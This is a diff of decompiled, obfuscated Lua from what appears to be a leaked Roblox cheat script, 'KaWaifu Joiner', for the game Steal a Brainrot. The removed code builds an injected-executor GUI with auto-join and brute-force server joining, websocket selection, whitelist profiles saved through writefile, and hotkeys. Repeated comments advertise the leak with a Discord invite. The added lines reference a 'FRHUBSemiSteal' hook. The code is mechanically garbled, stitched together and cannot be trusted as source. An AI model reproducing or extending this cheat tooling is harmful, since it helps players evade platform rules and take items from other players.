-	up_215 = slicedfn32
-	up_216 = tbl25
-	up_217 = tbl18
-	up_218 = slicedfn51  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_219 = slicedfn43
-	up_220 = tbl22
-	up_221 = nil
-	up_222 = slicedfn37
-	up_223 = slicedfn47
-	up_224 = slicedfn39
-	up_225 = sliced97
-	up_226 = sliced98
-	up_227 = sliced99
-	up_228 = slicedfn61  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-	up_229 = tbl19
-	;(function()up_209(up_210,"Quick actions");local B;local function I()local e,H=up_211 ();B.Text=("Auto Join  [<font color=\"%s\">%s</font>]"):format(up_212(H),e);end;up_213 =function(e)up_214.AutoJoin=e and true or false;up_215 ();if B then I();end;if up_216.miniAjText then local e,H=up_211 ();up_216.miniAjText.Text="Auto Join: "..e;up_216.miniAjText.TextColor3=H;end;if up_217.setAutoJoin then up_217.setAutoJoin(up_214.AutoJoin);end;end;B=up_218(up_210,{{text="",rich=true,callback=function()up_213 (not up_214.AutoJoin);end},{text="Rejoin",baseColor=Color3.fromRGB(150,62,74),hoverColor=Color3.fromRGB(182,78,92),flashColor=Color3.fromRGB(212,98,112),callback=function()up_219 ("Joiner","Rejoining this server...");if up_217.rejoin then up_217.rejoin();else pcall(function()game:GetService("TeleportService"):TeleportReconnect();end);end;end},{text="Clear logs",baseColor=Color3.fromRGB(64,36,52),hoverColor=Color3.fromRGB(84,46,66),flashColor=up_220.Accent,callback=function()local B=up_221 and(up_221 (up_214.MaxElapsedJoin))or 0;up_219 ("Logs",B>0 and"Cleared "..B..(B==1 and" entry"or" entries").." (older than "..tostring(up_214.MaxElapsedJoin).."s, or joined)"or"Nothing older than "..tostring(up_214.MaxElapsedJoin).."s (or joined) to clear");end}})[1];I();up_209(up_210,"Live brainrots");local B=up_222("Frame",{Size=UDim2.new(1,0,1,-122),BackgroundColor3=up_220.Sidebar,BackgroundTransparency=0.35,BorderSizePixel=0,ClipsDescendants=true,LayoutOrder=up_223(up_210),ZIndex=2,Parent=up_210});up_224(B,10);up_222("UIStroke",{Color=up_220.Stroke,Transparency=0.5,Thickness=1,Parent=B});local I=up_222("ScrollingFrame",{Position=UDim2.fromOffset(6,6),Size=UDim2.new(1,-12,1,-12),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=up_220.Accent,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=2,Parent=B});up_222("UIListLayout",{Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder,Parent=I});up_222("UIPadding",{PaddingRight=UDim.new(0,4),Parent=I});local B=nil;local e=nil;local H=nil;up_225 ,up_226 ,up_221 ,B,e,H,up_227 =up_228(I,function(I,a,K,K,L)if not up_217.joinServer then up_219 ("Joiner","Not connected \226\128\148 join Steal a Brainrot first");return;end;a=if L and up_217.joinAnimal then(up_217.joinAnimal(K,L,I))else(up_217.joinServer(K));if a=="cancelled"then up_219 ("Joiner","Join cancelled");elseif a then up_219 ("Joiner","Joining "..I.."...");else up_219 ("Joiner","That server is no longer available");end;end);up_229.feedJoinProgress=B;up_229.feedJoinEnded=e;up_229.feedRowName=H;end)()
-	up_230 = service
-	up_231 = tbl18
-	up_232 = tbl24
-	up_233 = tbl23
-	up_234 = slicedfn32
-	up_235 = slicedfn48
-	up_236 = Whitelist
-	up_237 = slicedfn55  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_238 = slicedfn35
-	up_239 = slicedfn31
-	up_240 = slicedfn37
-	up_241 = tbl22
-	up_242 = slicedfn39
-	up_243 = slicedfn38
-	up_244 = slicedfn36
-	up_245 = slicedfn49
-	up_246 = slicedfn51
-	up_247 = slicedfn47  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_248 = sliced84
-	up_249 = ScreenGui
-	up_250 = slicedfn60
-	up_251 = tbl21
-	up_252 = tbl17
-	up_253 = slicedfn43
-	up_254 = Frame
-	up_255 = flag20
-	up_256 = sliced95
-
-	up_257 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	;(function()local B,I,e,H,a,K,L,A,P,v,N={Profiles={},Active="Default"},{},"","All";local function S()local j=B.Profiles[B.Active];if not j then j={Global={Enabled=false,MinGen=0},Items={},createdAt=0};B.Profiles[B.Active]=j;end;j.Global=j.Global or{Enabled=false,MinGen=0};j.Items=j.Items or{};return j;end;local function j()pcall(function()writefile("KaWaifuJoiner_WLProfiles.json",up_230:JSONEncode({Profiles=B.Profiles,Active=B.Active}));end);end;local function p()if up_231.wlApply then local W=S();pcall(up_231.wlApply,W.Global,W.Items);end;end;up_232.push=p;pcall(function()if isfile and(isfile("KaWaifuJoiner_WLProfiles.json"))then local W=up_230:JSONDecode(readfile("KaWaifuJoiner_WLProfiles.json"));if type(W)=="table"then if type(W.Profiles)=="table"then B.Profiles=W.Profiles;end;if type(W.Active)=="string"then B.Active=W.Active;end;end;end;end);for W,r in pairs(B.Profiles)do if type(W)~="string"or type(r)~="table"then B.Profiles[W]=nil;else if type(r.Global)~="table"then r.Global={Enabled=false,MinGen=0};end;if type(r.Items)~="table"then r.Items={};end;for W,s in pairs(r.Items)do if type(W)~="string"or type(s)~="table"then r.Items[W]=nil;elseif s.Mutations~=nil and type(s.Mutations)~="table"then s.Mutations=nil;end;end;end;end;if not B.Profiles[B.Active]then B.Active="Default";end;local W=S().Items;local r=false;for s,y in pairs(up_233.Whitelist)do if type(s)=="string"and y and not W[s]then W[s]={State="Whitelist",MinGen=0,Mutations={}};r=true;end;end;if r then j();end;if next(up_233.Whitelist)~=nil then up_233.Whitelist={};up_234 ();end;P=function(s)if not B.Profiles[s]then return;end;B.Active=s;j();p();if A then A();end;L();a();end;up_235(up_236,"Global filter");local s=nil;local y=nil;local h=nil;do local _,o=up_237(up_236,"Global min generation",function(E,R,R)if E==""then L();return;end;S().Global.MinGen=math.max(0,up_238(E));j();p();L();end);s=o;o.Size=UDim2.new(1,-96,1,0);up_239 (o.Focused:Connect(function()o.Text=tostring(S().Global.MinGen);end));y=up_240("TextButton",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-5,0.5,0),Size=UDim2.fromOffset(66,24),BackgroundColor3=up_241.Bad:Lerp(up_241.Element,0.82),AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="Off",TextColor3=up_241.Bad:Lerp(up_241.Text,0.5),TextSize=14,ZIndex=3,Parent=_});up_242(y,7);h=up_240("UIStroke",{Color=up_241.Bad:Lerp(up_241.Stroke,0.55),Transparency=0.4,Thickness=1,Parent=y});up_239 (y.MouseButton1Click:Connect(function()local _=S().Global;_.Enabled=not _.Enabled;j();p();L();end));end;L=function()local _=S().Global;local o=_.Enabled and up_241.Good or up_241.Bad;y.Text=_.Enabled and"On"or"Off";up_243(y,0.15,{BackgroundColor3=o:Lerp(up_241.Element,0.82),TextColor3=o:Lerp(up_241.Text,0.5)});up_243(h,0.15,{Color=o:Lerp(up_241.Stroke,0.55)});s.Text=up_244(_.MinGen).."/s";end;up_235(up_236,"Brainrots");local s=up_245(up_236,"WL = auto-join it \194\183 BL = never \194\183 OFF = global filter applies. Set a min-gen per brainrot.");s.AutomaticSize=Enum.AutomaticSize.Y;do local y,y=up_237(up_236,"Search brainrots...",nil);up_239 (y:GetPropertyChangedSignal("Text"):Connect(function()e=y.Text:lower();K();end));end;local y={All="Filter: All",Whitelist="Filter: <font color=\"#6EC88C\">WL</font>",Blacklist="Filter: <font color=\"#D25F69\">BL</font>",None="Filter: <font color=\"#96848F\">Off</font>"};local h=nil;h=up_246(up_236,{{text="Filter: All",rich=true,callback=function()H=({All="Whitelist",Whitelist="Blacklist",Blacklist="None",None="All"})[H]or"All";h.Text=y[H];K();end}})[1];local y=up_240("Frame",{Size=UDim2.new(1,0,1,-234),BackgroundColor3=up_241.Sidebar,BackgroundTransparency=0.35,BorderSizePixel=0,ClipsDescendants=true,LayoutOrder=up_247(up_236),ZIndex=2,Parent=up_236});up_242(y,10);up_240("UIStroke",{Color=up_241.Stroke,Transparency=0.5,Thickness=1,Parent=y});local function h()local _=up_248 >0 and up_248 or 1;local o=math.max(20,math.floor(s.AbsoluteSize.Y/_+0.5));y.Size=UDim2.new(1,0,1,-(214+o));end;up_239 (s:GetPropertyChangedSignal("AbsoluteSize"):Connect(h));h();local s=up_240("ScrollingFrame",{Position=UDim2.fromOffset(6,6),Size=UDim2.new(1,-12,1,-12),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=up_241.Accent,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=2,Parent=y});up_240("UIListLayout",{Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder,Parent=s});up_240("UIPadding",{PaddingRight=UDim.new(0,4),Parent=s});local y;N=function()if not y then return;end;local _=y;y=nil;up_243(_.frame,0.2,{Size=UDim2.fromOffset(0,0)},Enum.EasingStyle.Quart,Enum.EasingDirection.In).Completed:Connect(function()if _.frame.Parent then _.frame:Destroy();end;if _.overlay.Parent then _.overlay:Destroy();end;end);end;local function _(o,E)N();local R,J=pcall(function()return up_231.mutationList and(up_231.mutationList());end);local l=R and type(J)=="table"and J or{};local T=up_240("TextButton",{Name="MutOverlay",Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Text="",ZIndex=45,Parent=up_249});local d=up_249.AbsolutePosition;local M=o.AbsolutePosition;local C=o.AbsoluteSize;o,R=math.floor(26*up_248 +0.5),math.max(math.floor(210*up_248 +0.5),C.X);local V,F=math.min(math.max(#l,2)*(o+3)+math.floor(42*up_248 +0.5),math.floor(300*up_248 +0.5)),up_240("Frame",{Name="MutDropdown",AnchorPoint=Vector2.new(1,1),Position=UDim2.fromOffset(M.X+C.X-d.X,M.Y+C.Y-d.Y),Size=UDim2.fromOffset(0,0),BackgroundColor3=up_241.Sidebar,BorderSizePixel=0,ClipsDescendants=true,ZIndex=46,Parent=up_249});up_242(F,10);up_240("UIStroke",{Color=up_241.Accent,Transparency=0.35,Thickness=1,Parent=F});up_240("TextLabel",{Position=UDim2.fromOffset(12,8),Size=UDim2.new(1,-24,0,20),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Mutations \226\128\148 "..E,TextColor3=up_241.Text,TextSize=math.floor(13*up_248 +0.5),TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=47,Parent=F});J=up_240("ScrollingFrame",{Position=UDim2.fromOffset(8,34),Size=UDim2.new(1,-16,1,-42),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=up_241.Accent,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=47,Parent=F});up_240("UIListLayout",{Padding=UDim.new(0,3),SortOrder=Enum.SortOrder.LayoutOrder,Parent=J});if#l==0 then up_240("TextLabel",{Size=UDim2.new(1,0,0,44),BackgroundTransparency=1,Text="Join Steal a Brainrot\10to load the mutation list",Font=Enum.Font.Gotham,TextColor3=up_241.TextDim,TextSize=math.floor(12*up_248 +0.5),ZIndex=47,Parent=J});else for M,U in ipairs(l)do d,C=false,S().Items[E];if C and C.Mutations then for l,l in ipairs(C.Mutations)do if l==U then d=true;break;end;end;end;local l=up_240("TextButton",{Size=UDim2.new(1,0,0,o),BackgroundColor3=up_241.Element,BackgroundTransparency=d and 0.1 or 0.6,AutoButtonColor=false,Font=Enum.Font.GothamMedium,Text=(d and"+ "or"")..U,TextColor3=Color3.fromHex(up_250(U)),TextTransparency=d and 0 or 0.25,TextSize=math.floor(12*up_248 +0.5),LayoutOrder=M,ZIndex=47,Parent=J});up_242(l,6);l.MouseButton1Click:Connect(function()local o=S().Items;local J=o[E];if not J then J={State="None",MinGen=0,Mutations={}};o[E]=J;end;J.Mutations=J.Mutations or{};o=nil;for d,M in ipairs(J.Mutations)do if M==U then o=d;break;end;end;if o then table.remove(J.Mutations,o);else table.insert(J.Mutations,U);end;j();p();J=not o;l.Text=(J and"+ "or"")..U;l.BackgroundTransparency=J and 0.1 or 0.6;l.TextTransparency=J and 0 or 0.25;J=I[E];if J then J.refresh();end;end);end;end;up_243(F,0.25,{Size=UDim2.fromOffset(R,V)},Enum.EasingStyle.Quart);y={frame=F,overlay=T};T.MouseButton1Click:Connect(N);end;local y={None="Whitelist",Whitelist="Blacklist",Blacklist="None"};local function o(E)if E=="Whitelist"then return"WL",up_241.Good;end;if E=="Blacklist"then return"BL",up_241.Bad;end;return"OFF",up_241.TextDim;end;local function E(R,J)local l=up_240("Frame",{Size=UDim2.new(1,0,0,34),BackgroundColor3=up_241.Element,BorderSizePixel=0,LayoutOrder=J,ZIndex=2,Parent=s});up_242(l,8);local s=up_240("TextButton",{Position=UDim2.fromOffset(4,5),Size=UDim2.fromOffset(42,24),BackgroundColor3=up_241.ElementHover,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="OFF",TextColor3=up_241.TextDim,TextSize=13,ZIndex=2,Parent=l});up_242(s,6);up_240("TextLabel",{Position=UDim2.fromOffset(52,0),Size=UDim2.new(1,-182,1,0),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text=R,TextColor3=up_241.Text,TextSize=15,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=l});local J=up_240("TextButton",{AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,-4,0,5),Size=UDim2.fromOffset(44,24),BackgroundColor3=up_241.ElementHover,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="Mut",TextColor3=up_241.TextDim,TextSize=13,ZIndex=2,Parent=l});up_242(J,6);local T=up_240("TextBox",{AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,-52,0,5),Size=UDim2.fromOffset(74,24),BackgroundColor3=up_241.SliderTrack,ClearTextOnFocus=false,Font=Enum.Font.Gotham,PlaceholderText="min gen",PlaceholderColor3=up_241.TextDim,Text="",TextColor3=up_241.Text,TextSize=13,ZIndex=2,Parent=l});up_242(T,6);local d={row=l,lname=R:lower(),refresh=function()local l=S().Items[R];local M,C=o(l and l.State or"None");s.Text=M;s.TextColor3=C;T.Text=l and(tonumber(l.MinGen)or 0)>0 and(up_244(l.MinGen))or"";M=l and l.Mutations and#l.Mutations or 0;J.Text=M>0 and"Mut:"..M or"Mut";J.TextColor3=M>0 and up_241.Accent or up_241.TextDim;end};s.MouseButton1Click:Connect(function()local s=S().Items;local o=s[R];if not o then o={State="None",MinGen=0,Mutations={}};s[R]=o;end;o.State=y[o.State or"None"]or"Whitelist";j();p();d.refresh();if H~="All"then K();end;end);T.Focused:Connect(function()local s=S().Items[R];T.Text=tostring(s and s.MinGen or 0);end);T.FocusLost:Connect(function()local s=S().Items;local y=s[R];if not y then y={State="None",MinGen=0,Mutations={}};s[R]=y;end;y.MinGen=math.max(0,up_238(T.Text));j();p();d.refresh();end);J.MouseButton1Click:Connect(function()_(J,R);end);d.refresh();I[R]=d;return d;end;K=function()local p=S().Items;for s,y in pairs(I)do local _=true;if H~="All"then local o=p[s];_=(o and o.State or"None")==H;end;_=if _ and e~=""then y.lname:find(e,1,true)~=nil else _;if y.row.Visible~=_ then y.row.Visible=_;end;end;end;local e=0;a=function(H)e+=1;local p=e;N();for s,s in pairs(I)do s.row:Destroy();end;table.clear(I);local I=S().Items;local S={};if up_231.wlKnown then local s,y=pcall(up_231.wlKnown);if s and type(y)=="table"then for s,s in ipairs(y)do S[s]=true;end;end;end;for s,s in ipairs(up_251)do S[s]=true;end;for s in pairs(I)do S[s]=true;end;I={};for s in pairs(S)do I[#I+1]=s;end;table.sort(I);for S,s in ipairs(I)do E(s,S);if H and S%24==0 then task.wait();if e~=p then return;end;end;end;K();end;up_232.refreshKnown=function()a(true);end;local I,e,H=up_252.ProfilesPanelWidth,up_252.ProfilesPanelGap,false;local K=up_240("Frame",{Name="ProfilesPanel",AnchorPoint=Vector2.new(0,0),Position=UDim2.fromScale(1,0),Size=UDim2.fromOffset(I,300),BackgroundColor3=up_241.Sidebar,BorderSizePixel=0,Visible=false,ZIndex=0,Parent=up_249});up_242(K,12);up_240("UIStroke",{Color=up_241.Accent,Transparency=0.35,Thickness=1,Parent=K});up_240("TextLabel",{Position=UDim2.fromOffset(12,8),Size=UDim2.new(1,-24,0,22),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Profiles",TextColor3=up_241.Accent2,TextSize=17,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=31,Parent=K});W=up_240("TextButton",{Position=UDim2.fromOffset(8,36),Size=UDim2.new(1,-16,0,30),BackgroundColor3=up_241.Good,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="+ New",TextColor3=Color3.fromRGB(16,24,18),TextSize=15,ZIndex=31,Parent=K});up_242(W,8);local S=up_240("ScrollingFrame",{Position=UDim2.fromOffset(8,74),Size=UDim2.new(1,-16,1,-82),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=up_241.Accent,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=31,Parent=K});up_240("UIListLayout",{Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder,Parent=S});local p=up_240("Frame",{AnchorPoint=Vector2.new(0.5,0),Position=UDim2.new(0.5,0,0.3,0),Size=UDim2.new(0.92,0,0,104),BackgroundColor3=up_241.Background,BorderSizePixel=0,Visible=false,ZIndex=33,Parent=K});up_242(p,10);up_240("UIStroke",{Color=up_241.Accent,Transparency=0.3,Thickness=1,Parent=p});up_240("TextLabel",{Position=UDim2.fromOffset(10,6),Size=UDim2.new(1,-20,0,18),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="New name:",TextColor3=up_241.Text,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=34,Parent=p});local s=up_240("TextBox",{Position=UDim2.fromOffset(10,28),Size=UDim2.new(1,-20,0,28),BackgroundColor3=up_241.Element,ClearTextOnFocus=false,Font=Enum.Font.Gotham,Text="",TextColor3=up_241.Text,TextSize=15,ZIndex=34,Parent=p});up_242(s,6);r=up_240("TextButton",{Position=UDim2.new(0.08,0,1,-36),Size=UDim2.new(0.38,0,0,26),BackgroundColor3=up_241.Good,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="OK",TextColor3=Color3.fromRGB(16,24,18),TextSize=14,ZIndex=34,Parent=p});up_242(r,6);h=up_240("TextButton",{Position=UDim2.new(0.54,0,1,-36),Size=UDim2.new(0.38,0,0,26),BackgroundColor3=up_241.Element,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="Cancel",TextColor3=up_241.Text,TextSize=14,ZIndex=34,Parent=p});up_242(h,6);local y;local _=up_240("Frame",{AnchorPoint=Vector2.new(0.5,0),Position=UDim2.new(0.5,0,0.32,0),Size=UDim2.new(0.92,0,0,92),BackgroundColor3=up_241.Background,BorderSizePixel=0,Visible=false,ZIndex=33,Parent=K});up_242(_,10);up_240("UIStroke",{Color=up_241.Bad,Transparency=0.3,Thickness=1,Parent=_});local o,E=up_240("TextLabel",{Position=UDim2.fromOffset(10,8),Size=UDim2.new(1,-20,0,34),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Delete this profile?",TextColor3=up_241.Text,TextSize=15,TextWrapped=true,ZIndex=34,Parent=_}),up_240("TextButton",{Position=UDim2.new(0.08,0,1,-36),Size=UDim2.new(0.38,0,0,26),BackgroundColor3=up_241.Bad,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="Yes",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=34,Parent=_});up_242(E,6);local R=up_240("TextButton",{Position=UDim2.new(0.54,0,1,-36),Size=UDim2.new(0.38,0,0,26),BackgroundColor3=up_241.Element,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="No",TextColor3=up_241.Text,TextSize=14,ZIndex=34,Parent=_});up_242(R,6);local J;A=function()p.Visible=false;_.Visible=false;y,J=nil,nil;for l,l in ipairs(S:GetChildren())do if l:IsA("Frame")then l:Destroy();end;end;local l={};for T,d in pairs(B.Profiles)do l[#l+1]={name=T,createdAt=tonumber(d.createdAt)or 0};end;table.sort(l,function(T,d)if T.createdAt~=d.createdAt then return T.createdAt<d.createdAt;end;return T.name<d.name;end);local T=#l;for d,M in ipairs(l)do local l=M.name;M=l==B.Active;local C=up_240("Frame",{Size=UDim2.new(1,0,0,38),BackgroundColor3=M and(Color3.fromRGB(46,66,50))or up_241.Element,BorderSizePixel=0,LayoutOrder=d,ZIndex=31,Parent=S});up_242(C,8);up_240("TextButton",{Position=UDim2.fromOffset(8,0),Size=UDim2.new(1,-66,1,0),BackgroundTransparency=1,AutoButtonColor=false,Font=M and Enum.Font.GothamBold or Enum.Font.GothamMedium,Text=l,TextColor3=M and up_241.Good or up_241.Text,TextSize=15,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=32,Parent=C}).MouseButton1Click:Connect(function()if l~=B.Active then P(l);up_253 ("Profiles","Switched to: "..l);end;end);M=up_240("TextButton",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-34,0.5,0),Size=UDim2.fromOffset(24,24),BackgroundColor3=up_241.ElementHover,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="\226\156\143\239\184\143",TextColor3=up_241.TextDim,TextSize=13,ZIndex=32,Parent=C});up_242(M,6);M.MouseButton1Click:Connect(function()y=l;s.Text=l;_.Visible=false;p.Visible=true;end);M=up_240("TextButton",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-6,0.5,0),Size=UDim2.fromOffset(24,24),BackgroundColor3=Color3.fromRGB(120,52,62),AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="\195\151",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=32,Parent=C});up_242(M,6);M.Visible=T>1;M.MouseButton1Click:Connect(function()J=l;o.Text="Delete '"..l.."'?";p.Visible=false;_.Visible=true;end);end;end;up_239 (W.MouseButton1Click:Connect(function()local S,W,o="Empty Config","Empty Config",0;while B.Profiles[W]do o+=1;W=S.." "..o;end;B.Profiles[W]={Global={Enabled=false,MinGen=0},Items={},createdAt=os.time()};P(W);up_253 ("Profiles","Created: "..W);end));up_239 (h.MouseButton1Click:Connect(function()p.Visible=false;y=nil;end));up_239 (r.MouseButton1Click:Connect(function()local S,W=y,s.Text;p.Visible=false;local p=S;y=nil;if not p or W==""or W==p or not B.Profiles[p]then return;end;if B.Profiles[W]then up_253 ("Profiles","Already exists: "..W);return;end;B.Profiles[W]=B.Profiles[p];B.Profiles[p]=nil;if B.Active==p then B.Active=W;end;j();A();up_253 ("Profiles","Renamed to: "..W);end));up_239 (R.MouseButton1Click:Connect(function()_.Visible=false;J=nil;end));up_239 (E.MouseButton1Click:Connect(function()local S=J;_.Visible=false;local p=S;J=nil;if not p or not B.Profiles[p]then return;end;B.Profiles[p]=nil;if B.Active==p then S=nil;for W in pairs(B.Profiles)do S=W;break;end;if not S then B.Profiles.Default={Global={Enabled=false,MinGen=0},Items={},createdAt=0};S="Default";end;P(S);else j();A();end;up_253 ("Profiles","Deleted: "..p);end));local function B()local P,S,j=up_249.AbsolutePosition,up_254.AbsolutePosition,up_254.AbsoluteSize;local p=S.X-P.X+j.X;return math.floor(p+e),math.floor(S.Y-P.Y+8),math.max(120,math.floor(j.Y)-16),(math.floor(p-I-8));end;local function e()if not K.Visible then return;end;local P,S,j,p=B();local W,r=UDim2.fromOffset(I,j),UDim2.fromOffset(H and P or p,S);if K.Size~=W then K.Size=W;end;if K.Position~=r then K.Position=r;end;end;local P;local function S(j)j=if j==nil then not H else j;if j==H then return nil;end;H=j;local p,W,r,s=B();K.Size=UDim2.fromOffset(I,r);if j then A();K.Position=UDim2.fromOffset(s,W);K.Visible=true;P=up_243(K,0.28,{Position=UDim2.fromOffset(p,W)},Enum.EasingStyle.Quad);else r=up_243(K,0.22,{Position=UDim2.fromOffset(s,W)},Enum.EasingStyle.Quad,Enum.EasingDirection.In);r.Completed:Connect(function()if not H then K.Visible=false;end;end);P=r;end;return P;end;v=function(B)if up_255 then return nil;end;return S(B);end;local B=false;up_256 =function()N();if H then B=true;return S(false);end;B=false;if K.Visible and P then return P;end;return nil;end;up_257 =function()if B and up_236.Visible then S(true);end;B=false;end;up_239 (up_254:GetPropertyChangedSignal("Position"):Connect(e));up_239 (up_254:GetPropertyChangedSignal("Size"):Connect(e));up_239 (up_236:GetPropertyChangedSignal("Visible"):Connect(function()if not up_236.Visible then N();end;v(up_236.Visible);end));L();a();end)()
-	up_258 = slicedfn48
-	up_259 = sliced100
-	up_260 = slicedfn54
-	up_261 = tbl23
-	up_262 = slicedfn33
-	up_263 = slicedfn53
-	up_264 = tbl22
-	up_265 = slicedfn52
-	up_266 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_267 = slicedfn55
-	up_268 = slicedfn43
-	up_269 = slicedfn37
-	up_270 = slicedfn47
-	up_271 = slicedfn50
-	up_272 = tbl18
-	up_273 = slicedfn31
-	up_274 = UserInputService
-	up_275 = slicedfn32
-	up_276 = slicedfn62  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_277 = flag19
-
-	up_278 = slicedfn34
-	;(function()up_258(up_259,"Joiner");up_260(up_259,"Teleport attempts",1,200,up_261.Attempts,function(B)up_261.Attempts=B;up_262 ();end,{uncapped=true});up_260(up_259,"Max server age (s)",0,60,up_261.MaxElapsedJoin,function(B)up_261.MaxElapsedJoin=B;up_262 ();end,{uncapped=true});up_263(up_259,"Show carpet logs",{{value="Yes",label="Yes",color=up_264.Good},{value="Only",label="Carpet only",color=up_264.Warn},{value="No",label="No",color=up_264.Bad}},up_261.CarpetMode,function(B)up_261.CarpetMode=B;up_262 ();end);up_265(up_259,"Auto-Join OG even if AJ is Off",up_261.AutoJoinOGOffAJ,function(B)up_261.AutoJoinOGOffAJ=B;up_262 ();if up_266 then up_266 (up_261.AutoJoin);end;end);up_263(up_259,"AJ mid-retries switch logic",{{value="Better Newest",label="Better Newest",color=up_264.Good},{value="Any Newest",label="Any Newest",color=up_264.Warn}},up_261.MidRetrySwitch,function(B)up_261.MidRetrySwitch=B;up_262 ();end,{chipWidth=118});up_265(up_259,"Brute-force join",up_261.BruteForceJoin,function(B)up_261.BruteForceJoin=B;up_262 ();end);up_265(up_259,"Auto-pick best websocket (at inject)",up_261.AutoPickWS,function(B)up_261.AutoPickWS=B;up_262 ();end);up_265(up_259,"Minimize on inject",up_261.MinimizeOnInject,function(B)up_261.MinimizeOnInject=B;up_262 ();end);up_258(up_259,"Sound");local B,B=up_267(up_259,"Alert sound ID",function(I,e,H)if I==""then H.Text=up_261.SoundId;return;end;e=I:match("%d+");if e then up_261.SoundId=e;up_262 ();H.Text=e;up_268 ("Sound","Alert sound set: "..e);else H.Text=up_261.SoundId;up_268 ("Sound","Invalid sound ID \226\128\148 numeric asset IDs only (kept "..up_261.SoundId..")");end;end);B.Text=up_261.SoundId;do B=up_269("Frame",{Size=UDim2.new(1,0,0,52),BackgroundTransparency=1,LayoutOrder=up_270(up_259),ZIndex=2,Parent=up_259});up_269("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8),VerticalAlignment=Enum.VerticalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder,Parent=B});up_260(up_259,"Alert volume",0,10,up_261.SoundVolume,function(I)up_261.SoundVolume=I;up_262 ();end,{parent=B,layoutOrder=1,size=UDim2.new(1,-96,0,52),decimals=1});local I;up_271(up_259,"Test",function()if up_272.testSound then up_272.testSound();return;end;pcall(function()if not I or not I.Parent then local e=game:GetService("SoundService");I=e:FindFirstChild("KaWaifuTestSound");if not I or not I:IsA("Sound")then I=Instance.new("Sound");I.Name="KaWaifuTestSound";I.Parent=e;end;end;I.SoundId="rbxassetid://"..up_261.SoundId;I.Volume=up_261.SoundVolume;if not I.IsLoaded then pcall(function()game:GetService("ContentProvider"):PreloadAsync({I});end);end;I:Play();end);end,{parent=B,layoutOrder=2,size=UDim2.new(0,88,0,40)});end;up_258(up_259,"Hotkeys");do local B;local I={};local function e(H)return H=="Minimize"and up_261.HotkeyMinimize or up_261.HotkeyAutoTP;end;local function H(a)local K=I[a];if K then K.Text=K:GetAttribute("hkTitle")..":  "..e(a);end;end;local function a(K,L)local A=up_271(up_259,"",function()if B and B~=L then H(B);end;B=L;I[L].Text=K..":  press a key... (Esc cancels)";end);A:SetAttribute("hkTitle",K);I[L]=A;H(L);end;a("Minimize","Minimize");a("Auto Join","AutoTP");up_273 (up_274.InputBegan:Connect(function(a)if a.UserInputType~=Enum.UserInputType.Keyboard then return;end;local K=a.KeyCode.Name;if B then a=B;B=nil;if K~="Escape"then for B in pairs(I)do if B~=a and e(B)==K then up_268 ("Hotkeys",K.." is already taken by "..B);H(a);return;end;end;if a=="Minimize"then up_261.HotkeyMinimize=K;else up_261.HotkeyAutoTP=K;end;up_275 ();end;H(a);return;end;if up_274:GetFocusedTextBox()then return;end;if K==up_261.HotkeyMinimize then task.spawn(up_276,not up_277 );elseif K==up_261.HotkeyAutoTP then up_266 (not up_261.AutoJoin);up_268 ("Auto Join",up_278 (),2);end;end));end;end)()
-	up_279 = slicedfn37
-	up_280 = slicedfn47
-	up_281 = sliced101
+if _G.FRHUBSemiSteal and _G.FRHUBSemiSteal.conn then
+    pcall(function() _G.FRHUBSemiSteal.conn:Disconnect() end)
 end
-
-local sliced100
-
-do
